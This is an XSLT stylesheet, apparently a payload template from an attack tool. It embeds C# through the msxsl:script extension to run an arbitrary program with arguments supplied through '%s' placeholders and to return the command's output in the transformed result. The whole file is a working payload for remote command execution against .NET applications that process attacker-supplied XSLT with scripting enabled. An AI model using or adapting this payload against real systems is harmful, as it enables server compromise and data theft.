<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
    <msxsl:script language="C#" implements-prefix="csharp_user">
        public string xml() {
        string cmd ="%s";
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName="%s";
        proc.StartInfo.Arguments = cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd(); return output;
        }
    </msxsl:script>
    <xsl:template match="/">
        <xsl:value-of select="csharp_user:xml()" />
    </xsl:template>
</xsl:stylesheet>